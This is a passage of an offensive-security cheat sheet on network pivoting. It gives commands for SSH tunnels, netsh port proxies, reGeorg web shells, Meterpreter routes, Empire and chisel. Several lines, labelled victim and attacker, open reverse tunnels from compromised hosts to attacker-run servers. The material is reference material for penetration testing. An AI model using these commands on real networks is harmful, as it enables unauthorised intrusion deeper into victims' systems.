+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenport</span><span class="p">=</span><span class="n">4545</span> <span class="n">connectaddress</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">44</span> <span class="n">connectport</span><span class="p">=</span><span class="n">4545</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenport</span><span class="p">=</span><span class="n">80</span> <span class="n">connectaddress</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">44</span> <span class="n">connectport</span><span class="p">=</span><span class="n">80</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c"># Correctly open the port on the machine</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="p">=</span><span class="s2">&quot;PortForwarding 80&quot;</span> <span class="n">dir</span><span class="p">=</span><span class="k">in</span> <span class="n">action</span><span class="p">=</span><span class="n">allow</span> <span class="n">protocol</span><span class="p">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="p">=</span><span class="n">80</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="p">=</span><span class="s2">&quot;PortForwarding 80&quot;</span> <span class="n">dir</span><span class="p">=</span><span class="n">out</span> <span class="n">action</span><span class="p">=</span><span class="n">allow</span> <span class="n">protocol</span><span class="p">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="p">=</span><span class="n">80</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="p">=</span><span class="s2">&quot;PortForwarding 4545&quot;</span> <span class="n">dir</span><span class="p">=</span><span class="k">in</span> <span class="n">action</span><span class="p">=</span><span class="n">allow</span> <span class="n">protocol</span><span class="p">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="p">=</span><span class="n">4545</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="p">=</span><span class="s2">&quot;PortForwarding 4545&quot;</span> <span class="n">dir</span><span class="p">=</span><span class="n">out</span> <span class="n">action</span><span class="p">=</span><span class="n">allow</span> <span class="n">protocol</span><span class="p">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="p">=</span><span class="n">4545</span>
+</code></pre></div>
+<ol>
+<li>listenaddress – is a local IP address waiting for a connection.</li>
+<li>listenport – local listening TCP port (the connection is waited on it).</li>
+<li>connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.</li>
+<li>connectport – is a TCP port to which the connection from listenport is forwarded to.</li>
+</ol>
+<h2 id="ssh">SSH</h2>
+<h3 id="socks-proxy">SOCKS Proxy</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ssh<span class="w"> </span>-D8080<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>host<span class="o">]</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-f<span class="w"> </span>-D<span class="w"> </span><span class="m">9000</span><span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>host<span class="o">]</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>-f<span class="w"> </span>:<span class="w"> </span>ssh<span class="w"> </span><span class="k">in</span><span class="w"> </span>background
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>-N<span class="w"> </span>:<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>execute<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span><span class="nb">command</span>
+</code></pre></div>
+<p>Cool Tip : Konami SSH Port forwarding</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="o">[</span>ENTER<span class="o">]</span><span class="w"> </span>+<span class="w"> </span><span class="o">[</span>~C<span class="o">]</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>-D<span class="w"> </span><span class="m">1090</span>
+</code></pre></div>
+<h3 id="local-port-forwarding">Local Port Forwarding</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ssh<span class="w"> </span>-L<span class="w"> </span><span class="o">[</span>bindaddr<span class="o">]</span>:<span class="o">[</span>port<span class="o">]</span>:<span class="o">[</span>dsthost<span class="o">]</span>:<span class="o">[</span>dstport<span class="o">]</span><span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>host<span class="o">]</span>
+</code></pre></div>
+<h3 id="remote-port-forwarding">Remote Port Forwarding</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh<span class="w"> </span>-R<span class="w"> </span><span class="o">[</span>bindaddr<span class="o">]</span>:<span class="o">[</span>port<span class="o">]</span>:<span class="o">[</span>localhost<span class="o">]</span>:<span class="o">[</span>localport<span class="o">]</span><span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>host<span class="o">]</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">3389</span>:10.1.1.224:3389<span class="w"> </span>root@10.11.0.32
+</code></pre></div>
+<h2 id="proxychains">Proxychains</h2>
+<p><strong>Config file</strong>: /etc/proxychains.conf</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="o">[</span>ProxyList<span class="o">]</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>socks4<span class="w"> </span>localhost<span class="w"> </span><span class="m">8080</span>
+</code></pre></div>
+<p>Set the SOCKS4 proxy then <code>proxychains nmap -sT 192.168.5.6</code></p>
+<h2 id="graftcp">Graftcp</h2>
+<blockquote>
+<p>A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.</p>
+</blockquote>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/26a0.svg" title=":warning:" /> Same as proxychains, with another mechanism to "proxify" which allow Go applications.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># https://github.com/hmgle/graftcp</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c"># Create a SOCKS5, using Chisel or another tool and forward it through SSH</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="p">(</span><span class="n">attacker</span><span class="p">)</span> <span class="p">$</span> <span class="n">ssh</span> <span class="n">-fNT</span> <span class="n">-i</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">id_rsa</span> <span class="n">-L</span> <span class="n">1080</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">1080</span> <span class="n">root</span><span class="nv">@IP_VPS</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="p">(</span><span class="n">vps</span><span class="p">)</span> <span class="p">$</span> <span class="p">./</span><span class="n">chisel</span> <span class="n">server</span> <span class="p">-</span><span class="n">-tls-key</span> <span class="p">./</span><span class="n">key</span><span class="p">.</span><span class="n">pem</span> <span class="p">-</span><span class="n">-tls-cert</span> <span class="p">./</span><span class="n">cert</span><span class="p">.</span><span class="n">pem</span> <span class="n">-p</span> <span class="n">8443</span> <span class="n">-reverse</span> 
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="p">(</span><span class="n">victim</span> <span class="n">1</span><span class="p">)</span> <span class="p">$</span> <span class="p">./</span><span class="n">chisel</span> <span class="n">client</span> <span class="p">-</span><span class="n">-tls-skip-verify</span> <span class="n">https</span><span class="p">://</span><span class="n">IP_VPS</span><span class="p">:</span><span class="n">8443</span> <span class="n">R</span><span class="p">:</span><span class="n">socks</span> 
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c"># Run graftcp and specify the SOCKS5</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">(</span><span class="n">attacker</span><span class="p">)</span> <span class="p">$</span> <span class="n">graftcp-local</span> <span class="n">-listen</span> <span class="p">:</span><span class="n">2233</span> <span class="n">-logfile</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">toto</span> <span class="n">-loglevel</span> <span class="n">6</span> <span class="n">-socks5</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">1080</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="p">(</span><span class="n">attacker</span><span class="p">)</span> <span class="p">$</span> <span class="n">graftcp</span> <span class="p">./</span><span class="n">nuclei</span> <span class="n">-u</span> <span class="n">http</span><span class="p">://</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">24</span>
+</code></pre></div>
+<p>Simple configuration file for graftcp</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1">## Listen address (default &quot;:2233&quot;)</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">listen</span> <span class="o">=</span> <span class="p">:</span><span class="mi">2233</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">loglevel</span> <span class="o">=</span> <span class="mi">1</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1">## SOCKS5 address (default &quot;127.0.0.1:1080&quot;)</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">socks5</span> <span class="o">=</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c1"># socks5_username = SOCKS5USERNAME</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="c1"># socks5_password = SOCKS5PASSWORD</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="c1">## Set the mode for select a proxy (default &quot;auto&quot;)</span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="n">select_proxy_mode</span> <span class="o">=</span> <span class="n">auto</span>
+</code></pre></div>
+<h2 id="web-socks-regeorg">Web SOCKS - reGeorg</h2>
+<p><a href="https://github.com/sensepost/reGeorg">reGeorg</a>, the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</p>
+<p>Drop one of the following files on the server:</p>
+<ul>
+<li>tunnel.ashx</li>
+<li>tunnel.aspx</li>
+<li>tunnel.js</li>
+<li>tunnel.jsp</li>
+<li>tunnel.nosocket.php</li>
+<li>tunnel.php</li>
+<li>tunnel.tomcat.5.jsp</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">python</span> <span class="n">reGeorgSocksProxy</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">compromised</span><span class="o">.</span><span class="n">host</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">jsp</span> <span class="c1"># the socks proxy will be on port 8080</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">optional</span> <span class="n">arguments</span><span class="p">:</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>           <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>  <span class="o">-</span><span class="n">l</span> <span class="p">,</span> <span class="o">--</span><span class="n">listen</span><span class="o">-</span><span class="n">on</span>     <span class="n">The</span> <span class="n">default</span> <span class="n">listening</span> <span class="n">address</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>  <span class="o">-</span><span class="n">p</span> <span class="p">,</span> <span class="o">--</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span>   <span class="n">The</span> <span class="n">default</span> <span class="n">listening</span> <span class="n">port</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>  <span class="o">-</span><span class="n">r</span> <span class="p">,</span> <span class="o">--</span><span class="n">read</span><span class="o">-</span><span class="n">buff</span>     <span class="n">Local</span> <span class="n">read</span> <span class="n">buffer</span><span class="p">,</span> <span class="nb">max</span> <span class="n">data</span> <span class="n">to</span> <span class="n">be</span> <span class="n">sent</span> <span class="n">per</span> <span class="n">POST</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>  <span class="o">-</span><span class="n">u</span> <span class="p">,</span> <span class="o">--</span><span class="n">url</span>           <span class="n">The</span> <span class="n">url</span> <span class="n">containing</span> <span class="n">the</span> <span class="n">tunnel</span> <span class="n">script</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>  <span class="o">-</span><span class="n">v</span> <span class="p">,</span> <span class="o">--</span><span class="n">verbose</span>       <span class="n">Verbose</span> <span class="n">output</span><span class="p">[</span><span class="n">INFO</span><span class="o">|</span><span class="n">DEBUG</span><span class="p">]</span>
+</code></pre></div>
+<h2 id="web-socks-pivotnacci">Web SOCKS - pivotnacci</h2>
+<p><a href="https://github.com/blackarrowsec/pivotnacci">pivotnacci</a>, a tool to make socks connections through HTTP agents.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">pip3</span> <span class="n">install</span> <span class="n">pivotnacci</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">pivotnacci</span>  <span class="n">https</span><span class="p">://</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">agent</span><span class="p">.</span><span class="n">php</span> <span class="p">-</span><span class="n">-password</span> <span class="s2">&quot;s3cr3t&quot;</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">pivotnacci</span>  <span class="n">https</span><span class="p">://</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">agent</span><span class="p">.</span><span class="n">php</span> <span class="p">-</span><span class="n">-polling-interval</span> <span class="n">2000</span>
+</code></pre></div>
+<h2 id="metasploit">Metasploit</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Meterpreter list active port forwards</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">portfwd</span> <span class="n">list</span> 
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">portfwd</span> <span class="n">add</span> <span class="err">–</span><span class="n">l</span> <span class="n">3389</span> <span class="err">–</span><span class="n">p</span> <span class="n">3389</span> <span class="err">–</span><span class="nb">r </span><span class="n">target-host</span> 
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">portfwd</span> <span class="n">add</span> <span class="n">-l</span> <span class="n">88</span> <span class="n">-p</span> <span class="n">88</span> <span class="n">-r</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">portfwd</span> <span class="n">add</span> <span class="n">-L</span> <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">-l</span> <span class="n">445</span> <span class="n">-r</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">57</span><span class="p">.</span><span class="n">102</span> <span class="n">-p</span> <span class="n">445</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c"># Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="n">portfwd</span> <span class="n">delete</span> <span class="err">–</span><span class="n">l</span> <span class="n">3389</span> <span class="err">–</span><span class="n">p</span> <span class="n">3389</span> <span class="err">–</span><span class="nb">r </span><span class="n">target-host</span> 
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="c"># Meterpreter delete all port forwards</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="n">portfwd</span> <span class="n">flush</span> 
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="n">or</span>
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>
+<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="c"># Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0</span>
+<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="n">run</span> <span class="n">autoroute</span> <span class="n">-s</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span> 
+<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="n">use</span> <span class="n">auxiliary</span><span class="p">/</span><span class="n">server</span><span class="p">/</span><span class="n">socks_proxy</span>
+<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="nb">set </span><span class="n">SRVPORT</span> <span class="n">9090</span>
+<a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="nb">set </span><span class="n">VERSION</span> <span class="n">4a</span>
+<a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="c"># or</span>
+<a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="n">use</span> <span class="n">auxiliary</span><span class="p">/</span><span class="n">server</span><span class="p">/</span><span class="n">socks4a</span>     <span class="c"># (deprecated)</span>
+<a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>
+<a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>
+<a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="c"># Meterpreter list all active routes</span>
+<a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="n">run</span> <span class="n">autoroute</span> <span class="n">-p</span> 
+<a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a>
+<a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="n">route</span> <span class="c">#Meterpreter view available networks the compromised host can access</span>
+<a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="c"># Meterpreter add route for 192.168.14.0/24 via Session number.</span>
+<a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a><span class="n">route</span> <span class="n">add</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">0</span> <span class="n">255</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">0</span> <span class="n">3</span> 
+<a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a><span class="c"># Meterpreter delete route for 192.168.14.0/24 via Session number.</span>
+<a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a><span class="n">route</span> <span class="n">delete</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">0</span> <span class="n">255</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">0</span> <span class="n">3</span> 
+<a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a><span class="c"># Meterpreter delete all routes</span>
+<a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a><span class="n">route</span> <span class="n">flush</span> 
+</code></pre></div>
+<h2 id="empire">Empire</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">(</span><span class="n">Empire</span><span class="p">)</span> <span class="p">&gt;</span> <span class="n">socksproxyserver</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="p">(</span><span class="n">Empire</span><span class="p">)</span> <span class="p">&gt;</span> <span class="n">use</span> <span class="n">module</span> <span class="n">management</span><span class="p">/</span><span class="n">invoke_socksproxy</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="p">(</span><span class="n">Empire</span><span class="p">)</span> <span class="p">&gt;</span> <span class="nb">set </span><span class="n">remoteHost</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="p">(</span><span class="n">Empire</span><span class="p">)</span> <span class="p">&gt;</span> <span class="n">run</span>
+</code></pre></div>
+<h2 id="sshuttle">sshuttle</h2>
+<p>Transparent proxy server that works as a poor man's VPN. Forwards over ssh. </p>
+<ul>
+<li>Doesn't require admin. </li>
+<li>Works with Linux and MacOS.</li>
+<li>Supports DNS tunneling.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">pacman</span> <span class="n">-Sy</span> <span class="n">sshuttle</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">apt-get</span> <span class="n">install</span> <span class="n">sshuttle</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">sshuttle</span> <span class="n">-vvr</span> <span class="n">user</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">10</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">sshuttle</span> <span class="n">-vvr</span> <span class="n">username</span><span class="nv">@pivot_host</span> <span class="n">10</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span> 
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="c"># using a private key</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="p">$</span> <span class="n">sshuttle</span> <span class="n">-vvr</span> <span class="n">root</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">10</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span> <span class="n">-e</span> <span class="s2">&quot;ssh -i ~/.ssh/id_rsa&quot;</span> 
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c"># -x == exclude some network to not transmit over the tunnel</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="c"># -x x.x.x.x.x/24</span>
+</code></pre></div>
+<h2 id="chisel">chisel</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">go</span> <span class="n">get</span> <span class="n">-v</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">jpillora</span><span class="p">/</span><span class="n">chisel</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c"># forward port 389 and 88 to hacker computer</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="n">user</span><span class="nv">@hacker</span><span class="p">$</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">chisel</span><span class="p">/</span><span class="n">chisel</span> <span class="n">server</span> <span class="n">-p</span> <span class="n">8008</span> <span class="p">-</span><span class="n">-reverse</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">user</span><span class="nv">@victim</span><span class="p">$</span> <span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">client</span> <span class="n">YOUR_IP</span><span class="p">:</span><span class="n">8008</span> <span class="n">R</span><span class="p">:</span><span class="n">88</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">88</span> <span class="n">R</span><span class="p">:</span><span class="n">389</span><span class="p">:</span><span class="n">localhost</span><span class="p">:</span><span class="n">389</span> 
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c"># SOCKS</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="n">user</span><span class="nv">@victim</span><span class="p">$</span> <span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">client</span> <span class="n">YOUR_IP</span><span class="p">:</span><span class="n">8008</span> <span class="n">R</span><span class="p">:</span><span class="n">socks</span>
+</code></pre></div>
+<h3 id="sharpchisel">SharpChisel</h3>
+<p>A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel</p>
